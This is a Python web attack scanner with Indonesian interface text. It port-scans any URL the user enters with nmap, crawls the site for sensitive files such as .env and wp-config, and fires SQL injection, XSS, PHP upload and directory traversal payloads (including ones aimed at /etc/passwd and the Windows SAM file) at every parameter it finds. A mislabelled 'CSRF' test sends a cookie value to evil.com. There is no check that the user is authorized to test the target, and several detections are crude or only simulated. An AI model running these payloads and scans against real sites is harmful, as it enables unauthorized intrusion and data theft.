import requests
import platform
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
import socket
import nmap
from requests.exceptions import RequestException, ConnectTimeout
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
import re
import time
import os
import logging
import warnings

# Configure logging to capture detailed information
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Suppress warnings
warnings.filterwarnings("ignore")

console = Console()

def clear_screen():
    if platform.system().lower() == "windows":
        os.system('cls')
    else:
        os.system('clear')

def display_info(info):
    table = Table(title="Informasi Target", show_header=True, header_style="bold blue")
    table.add_column("Kategori", justify="left")
    table.add_column("Detail", justify="center")

    table.add_row("Alamat IP", info['Alamat IP'])
    table.add_row("Port Terbuka", ', '.join(map(str, info['Port Terbuka'])) if info['Port Terbuka'] else "Tidak ada")
    table.add_row("Header", str(info['Header']))

    console.print(table)

def display_vulnerabilities(vulnerabilities):
    table = Table(title="Kerentanan yang Ditemukan", show_header=True, header_style="bold red")
    table.add_column("URL", justify="left")
    table.add_column("Parameter", justify="center")
    table.add_column("Payload", justify="center")
    table.add_column("Response Code", justify="center")
    table.add_column("Severity", justify="center")
    table.add_column("Details", justify="center")

    for vuln in vulnerabilities:
        table.add_row(vuln['URL'], vuln.get('Parameter', 'N/A'), vuln.get('Payload', 'N/A'),
                      str(vuln.get('Response Code', 'N/A')), vuln.get('Severity', 'N/A'), vuln.get('Details', 'N/A'))

    console.print(table)

def display_crawled_data(crawled_data):
    table = Table(title="Data yang Dirayapi", show_header=True, header_style="bold green")
    table.add_column("URL", justify="left")
    table.add_column("Details", justify="center")

    for entry in crawled_data:
        table.add_row(entry['url'], entry.get('details', 'N/A'))

    console.print(table)

def request_with_retry(url, method='GET', max_retries=3, timeout=10, **kwargs):
    for attempt in range(max_retries):
        try:
            response = requests.request(method, url, timeout=timeout, **kwargs)
            if response.status_code == 404:
                logging.warning(f"404 Not Found: {url}")
                return None
            response.raise_for_status()
            return response
        except (ConnectTimeout, RequestException) as e:
            logging.warning(f"Attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(2)  # Wait before retrying
            else:
                logging.error(f"Failed to retrieve {url} after {max_retries} attempts.")
                return None

def detect_waf(url):
    waf_patterns = {
        'Cloudflare': 'cf-ray',
        'AWS WAF': 'x-amzn-waf',
        'ModSecurity': 'modsecurity',
        'Sucuri': 'x-sucuri-id',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    response = request_with_retry(url, headers=headers)
    if response:
        for waf, pattern in waf_patterns.items():
            if pattern.lower() in response.headers:
                return waf
    return None

def gather_info(target_url):
    if not target_url.startswith(('http://', 'https://')):
        target_url = "http://" + target_url

    parsed_url = urlparse(target_url)
    ip_address = socket.gethostbyname(parsed_url.hostname)

    scanner = nmap.PortScanner()
    open_ports = []
    try:
        scanner.scan(ip_address, '1-1024')
        open_ports = [port for port in scanner[ip_address]['tcp'] if scanner[ip_address]['tcp'][port]['state'] == 'open']
    except Exception as e:
        logging.error(f"Failed to scan ports: {e}")

    response = request_with_retry(target_url)
    headers = response.headers if response else "Tidak ada respons yang diterima."

    return {
        "Alamat IP": ip_address,
        "Port Terbuka": open_ports,
        "Header": headers,
    }

def crawl_website(start_url):
    urls_to_visit = {start_url}
    visited_urls = set()
    crawled_data = []

    sensitive_file_patterns = [
        r'\.env$', r'\.git$', r'\.htaccess$', r'config\.php$', r'backup$', r'database$', r'\.bak$', r'\.sql$',
        r'\.log$', r'\.json$', r'\.yaml$', r'config\.js$', r'\.old$', r'\.inc$', r'web\.config$', r'wp-config$'
    ]

    with Progress(
        TextColumn("[bold cyan]Merayapi Situs Web dan Ekstraksi Parameter...[/bold cyan]"),
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Memproses...", total=len(urls_to_visit))

        while urls_to_visit:
            url = urls_to_visit.pop()
            if url in visited_urls:
                continue

            visited_urls.add(url)
            response = request_with_retry(url)
            if response is None or not response.text.strip():
                continue

            soup = BeautifulSoup(response.text, 'html.parser')
            domain = urlparse(url).netloc
            params = {}

            query_params = parse_qs(urlparse(url).query)
            if query_params:
                params.update(query_params)

            for link in soup.find_all('a', href=True):
                full_url = urljoin(url, link['href'])
                if urlparse(full_url).netloc == domain and full_url not in visited_urls:
                    urls_to_visit.add(full_url)
                    if any(re.search(pattern, full_url) for pattern in sensitive_file_patterns):
                        crawled_data.append({"url": full_url, "details": "Potensi file sensitif ditemukan."})

            crawled_data.append({"url": url, "params": params})
            progress.update(task, advance=1)

    return crawled_data

def test_vulnerabilities(crawled_data):
    vulnerabilities = []

    detected_waf = detect_waf(crawled_data[0]['url'])
    if detected_waf:
        console.print(f"[bold yellow]WAF terdeteksi: {detected_waf}[/bold yellow]")

    for entry in crawled_data:
        url = entry['url']
        params = entry.get('params', {})

        data = {'url': url, 'params': params}

        sqli_vuln = test_sql_injection(data)
        if sqli_vuln:
            vulnerabilities.extend(sqli_vuln)

        xss_vuln = test_xss(data)
        if xss_vuln:
            vulnerabilities.extend(xss_vuln)

        csrf_vuln = test_csrf(data)
        if csrf_vuln:
            vulnerabilities.extend(csrf_vuln)

        file_upload_vuln = test_file_upload(data)
        if file_upload_vuln:
            vulnerabilities.extend(file_upload_vuln)

        directory_traversal_vuln = test_directory_traversal(data)
        if directory_traversal_vuln:
            vulnerabilities.extend(directory_traversal_vuln)

    return vulnerabilities

def test_sql_injection(data):
    url = data['url']
    parameters = data.get('params', {})

    payloads = [
        "' OR '1'='1",  # Classic SQLi
        '" OR "1"="1',
        "' UNION SELECT NULL--",  # SQLi with UNION
        "' AND SLEEP(5)--",  # Time-based SQLi
        '" AND SLEEP(5)--',
        "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END)--",
        "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END)--",  # PostgreSQL Time-based SQLi
        "' AND 1=1--",  # Classic SQLi with comment
        '" AND 1=1--'
    ]

    keywords_to_detect = ["syntax error", "sql", "database", "warning", "mysql", "psql", "oracle", "error"]

    vulnerabilities = []

    for param in parameters:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = request_with_retry(test_url)

            if response:
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in keywords_to_detect):
                    vulnerabilities.append({
                        'URL': test_url,
                        'Parameter': param,
                        'Payload': payload,
                        'Response Code': response.status_code,
                        'Severity': 'High',
                        'Details': 'Potensi kerentanan SQL Injection terdeteksi.'
                    })
    return vulnerabilities

def test_xss(data):
    url = data['url']
    parameters = data.get('params', {})

    payloads = [
        '<script>alert(1)</script>',  # Basic XSS
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe/src="javascript:alert(1)"></iframe>'
    ]

    vulnerabilities = []

    for param in parameters:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = request_with_retry(test_url)

            if response:
                if payload in response.text:
                    vulnerabilities.append({
                        'URL': test_url,
                        'Parameter': param,
                        'Payload': payload,
                        'Response Code': response.status_code,
                        'Severity': 'Medium',
                        'Details': 'Potensi kerentanan XSS terdeteksi.'
                    })
    return vulnerabilities

def test_csrf(data):
    url = data['url']
    parameters = data.get('params', {})

    csrf_payload = {
        'param': '<img src="http://evil.com/csrf?cookie=' + str(os.getenv('COOKIE')) + '">'
    }

    vulnerabilities = []

    for param in parameters:
        test_url = f"{url}?{param}={csrf_payload['param']}"
        response = request_with_retry(test_url)

        if response:
            if 'csrf' in response.text.lower():  # Simulating detection
                vulnerabilities.append({
                    'URL': test_url,
                    'Parameter': param,
                    'Payload': csrf_payload['param'],
                    'Response Code': response.status_code,
                    'Severity': 'High',
                    'Details': 'Potensi kerentanan CSRF terdeteksi.'
                })
    return vulnerabilities

def test_file_upload(data):
    url = data['url']
    parameters = data.get('params', {})

    test_files = [
        ('test.php', '<?php phpinfo(); ?>'),
        ('test.jpg', 'test')
    ]

    vulnerabilities = []

    for param in parameters:
        for filename, filecontent in test_files:
            files = {'file': (filename, filecontent)}
            response = request_with_retry(url, method='POST', files=files)

            if response and 'phpinfo' in response.text:
                vulnerabilities.append({
                    'URL': url,
                    'Parameter': param,
                    'Payload': filename,
                    'Response Code': response.status_code,
                    'Severity': 'High',
                    'Details': 'Potensi kerentanan File Upload terdeteksi.'
                })
    return vulnerabilities

def test_directory_traversal(data):
    url = data['url']
    parameters = data.get('params', {})

    payloads = [
        '../../../etc/passwd',
        '..\\..\\Windows\\System32\\config\\SAM',
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2fetc%2fpasswd',
        '....//....//....//etc//passwd'
    ]

    vulnerabilities = []

    for param in parameters:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = request_with_retry(test_url)

            if response and 'root' in response.text:
                vulnerabilities.append({
                    'URL': test_url,
                    'Parameter': param,
                    'Payload': payload,
                    'Response Code': response.status_code,
                    'Severity': 'High',
                    'Details': 'Potensi kerentanan Directory Traversal terdeteksi.'
                })
    return vulnerabilities

def main():
    clear_screen()
    console.print("[bold green]Pengujian Keamanan Web[/bold green]")

    target_url = input("Masukkan URL target: ")

    if not target_url:
        console.print("[bold red]URL target tidak boleh kosong![/bold red]")
        return

    info = gather_info(target_url)
    display_info(info)

    crawled_data = crawl_website(target_url)
    display_crawled_data(crawled_data)

    vulnerabilities = test_vulnerabilities(crawled_data)
    display_vulnerabilities(vulnerabilities)

if __name__ == "__main__":
    main()
